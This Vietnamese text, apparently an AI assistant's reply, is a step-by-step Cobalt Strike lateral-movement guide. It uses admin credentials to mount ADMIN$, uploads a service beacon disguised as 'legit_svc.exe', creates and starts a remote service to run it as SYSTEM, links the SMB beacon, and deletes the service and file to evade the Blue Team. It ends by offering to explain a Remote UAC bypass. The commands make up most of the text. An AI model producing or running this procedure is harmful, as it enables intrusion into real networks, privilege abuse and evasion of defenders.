@@ -1,0 +1,68 @@
+Để sử dụng user và password của tài khoản Admin tạo kết nối và truy cập vào share mạng ADMIN$ trước, bạn cần thực hiện một bước gọi là Xác thực thiết lập phiên SMB (SMB Session Authentication). Trong môi trường Windows, việc này được thực hiện thông qua lệnh net use hoặc cơ chế tạo Token trong Cobalt Strike.
+Dưới đây là quy trình 5 bước thủ công hoàn chỉnh, bắt đầu từ việc dùng tài khoản/mật khẩu để chiếm quyền truy cập ADMIN$:
+
+Bước 1: Xác thực bằng User/Pass để truy cập ADMIN$
+
+Trước khi có thể upload file hay ra lệnh cho máy mục tiêu, bạn phải chứng minh với máy mục tiêu bạn là Admin.
+Từ Beacon console hiện tại, bạn có 2 cách để thực hiện:
+
+Cách A: Dùng lệnh make_token của Cobalt Strike (Khuyến khích)
+
+Lệnh này sẽ tạo ra một Token giả lập danh tính của Admin mục tiêu ngay trong Beacon hiện tại của bạn. Các lệnh mạng (SMB, RPC) sau đó sẽ tự động dùng Token này để xác thực.
+bash
+# Cấu hình: make_token [DOMAIN hoặc Tên_Máy_Mục_Tiêu] [Username] [Password]
+make_token . Administrator Password123!
+Hãy thận trọng khi sử dụng mã.
+(Dấu chấm . đại diện cho Local Account của máy mục tiêu, nếu là domain thì thay bằng tên Domain)
+
+Cách B: Dùng lệnh Native Windows net use
+
+Nếu không muốn dùng make_token, bạn có thể ánh xạ thẳng một kết nối SMB tới ổ đĩa mạng của máy mục tiêu:
+bash
+shell net use \\TargetComp\ADMIN$ /user:Administrator Password123!
+Hãy thận trọng khi sử dụng mã.
+Kiểm tra thành công: Sau khi chạy 1 trong 2 cách trên, bạn có thể kiểm tra xem đã truy cập được ADMIN$ chưa bằng lệnh: shell dir \\TargetComp\ADMIN$
+
+Bước 2: Upload file Beacon Payload qua ADMIN$
+
+Sau khi đã thông qua bước xác thực ở Bước 1, bạn tiến hành upload file Service Beacon (đã tạo sẵn từ trước, ví dụ đặt tên là legit_svc.exe).
+bash
+# Dùng lệnh upload của Cobalt Strike để đẩy file qua đường truyền SMB đã xác thực
+upload C:\path\to\legit_svc.exe \\TargetComp\ADMIN$\legit_svc.exe
+Hãy thận trọng khi sử dụng mã.
+Lúc này file sẽ nằm tại thư mục C:\Windows\legit_svc.exe của máy mục tiêu.
+
+Bước 3: Tạo và Trigger Windows Service từ xa
+
+Bây giờ bạn cần ra lệnh cho Service Control Manager (SCM) của máy mục tiêu đăng ký file vừa rồi thành một Service và khởi chạy nó. Vì đã có token/kết nối ở Bước 1, bạn có quyền làm việc này qua cổng 445 (RPC over SMB).
+Sử dụng lệnh sc của Windows thông qua quyền Admin đã thiết lập:
+bash
+# 1. Tạo một service mới tên là "LegitService" trỏ vào file exe vừa upload
+shell sc \\TargetComp create LegitService binPath= "C:\Windows\legit_svc.exe" start= demand
+
+# 2. Ra lệnh khởi chạy service này
+shell sc \\TargetComp start LegitService
+Hãy thận trọng khi sử dụng mã.
+Khi service chạy, payload bên trong legit_svc.exe sẽ được thực thi dưới quyền tối cao NT AUTHORITY\SYSTEM và mở ra một Named Pipe ngầm.
+
+Bước 4: Dùng lệnh link để lấy Session về Cobalt Strike
+
+Do file Service Beacon bạn tạo là dạng SMB Beacon, khi nó khởi chạy ở Bước 3, nó sẽ "lắng nghe" các kết nối đến thông qua Named Pipe. Bạn chỉ cần ra lệnh kết nối từ Beacon hiện tại:
+bash
+# Kết nối tới máy mục tiêu qua giao thức SMB Beacon
+link TargetComp
+Hãy thận trọng khi sử dụng mã.
+Ngay lập tức, một biểu tượng Beacon mới (hình chiếc xích kết nối peer-to-peer) sẽ xuất hiện trên màn hình Cobalt Strike của bạn. Bạn đã di chuyển ngang thành công.
+
+Bước 5: Dọn dẹp dấu vết (OpSec)
+
+Để tránh bị đội ngũ bảo mật (Blue Team) phát hiện khi rà soát hệ thống, bạn cần xóa Service và xóa file thực thi ngay sau khi đã có Session mới ổn định.
+Từ Beacon cũ (hoặc Beacon mới đều được, miễn là có quyền Admin):
+bash
+# 1. Xóa service khỏi danh sách quản lý của Windows
+shell sc \\TargetComp delete LegitService
+
+# 2. Xóa file thực thi trên ổ cứng máy mục tiêu
+shell del \\TargetComp\ADMIN$\legit_svc.exe
+Hãy thận trọng khi sử dụng mã.
+Trong trường hợp tài khoản Admin bạn dùng là Local Admin (không phải Domain Admin) và máy mục tiêu chạy Windows 10/11 hoặc Server đời mới, việc kết nối ADMIN$ có thể bị chặn bởi cơ chế UAC từ xa (Remote UAC). Bạn có muốn tôi hướng dẫn cách bypass hoặc kiểm tra thiết lập LocalAccountTokenFilterPolicy khi gặp lỗi này không?
